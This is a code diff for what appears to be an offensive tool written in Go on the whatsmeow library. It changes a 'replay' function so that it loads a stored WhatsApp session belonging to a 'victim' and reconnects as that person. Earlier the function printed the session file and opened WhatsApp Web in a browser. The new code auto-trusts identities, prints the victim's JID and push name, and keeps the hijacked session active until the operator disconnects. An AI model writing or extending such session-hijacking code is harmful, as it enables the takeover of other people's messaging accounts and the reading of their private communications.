@@ -18,6 +18,7 @@ import (
 
 	"go.mau.fi/whatsmeow"
 	"go.mau.fi/whatsmeow/store"
+	"go.mau.fi/whatsmeow/types"
 	"go.mau.fi/whatsmeow/util/keys"
 	waLog "go.mau.fi/whatsmeow/util/log"
 	"rsc.io/qr"
@@ -605,26 +606,46 @@ func doReplay(reader *bufio.Reader) {
 		return
 	}
 
-	sessionFile := filepath.Join(s.Profile, "session.json")
-	data, err := os.ReadFile(sessionFile)
+	sd, err := loadSessionData(s.Profile)
 	if err != nil {
-		fmt.Printf("%s[!] Failed to read session file: %v%s\n", utils.Red, err, utils.Reset)
+		fmt.Printf("%s[!] Failed to load session: %v%s\n", utils.Red, err, utils.Reset)
 		utils.WaitForEnter(reader)
 		return
 	}
 
-	fmt.Printf("%s[+] Session data loaded (%d bytes)%s\n", utils.Green, len(data), utils.Reset)
-	fmt.Printf("%s[+] Session data:%s\n%s\n", utils.Yellow, utils.Reset, string(data))
+	fmt.Printf("%s[+] Session loaded: %s%s\n", utils.Green, sd.Timestamp, utils.Reset)
+	if sd.JIDUser != "" {
+		fmt.Printf("%s[+] JID: %s@%s%s\n", utils.Green, sd.JIDUser, sd.JIDServer, utils.Reset)
+	}
+	fmt.Printf("%s[+] Connecting as victim...%s\n", utils.Yellow, utils.Reset)
 
-	browser := detectBrowser()
-	if browser == "" {
-		fmt.Printf("%s[!] No browser found%s\n", utils.Red, utils.Reset)
+	device := deviceFromSession(sd)
+	cli := whatsmeow.NewClient(device, waLog.Noop)
+	cli.AutoTrustIdentity = true
+
+	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+	defer cancel()
+
+	err = cli.Connect()
+	if err != nil {
+		fmt.Printf("%s[!] Replay failed: %v%s\n", utils.Red, err, utils.Reset)
 		utils.WaitForEnter(reader)
 		return
 	}
 
-	exec.Command(browser, "--new-window", "https://web.whatsapp.com").Start()
+	fmt.Printf("%s[+] Connected! Victim session is active.%s\n", utils.Green, utils.Reset)
+	fmt.Printf("%s[+] PushName: %s%s\n", utils.Yellow, sd.PushName, utils.Reset)
+	fmt.Printf("%s[+] Press Enter to disconnect...%s", utils.Green, utils.Reset)
 
+	go func() {
+		<-ctx.Done()
+		cli.Disconnect()
+	}()
+
+	reader.ReadString('\n')
+	cancel()
+	cli.Disconnect()
+	fmt.Printf("%s[+] Disconnected.%s\n", utils.Yellow, utils.Reset)
 	utils.WaitForEnter(reader)
 }
 
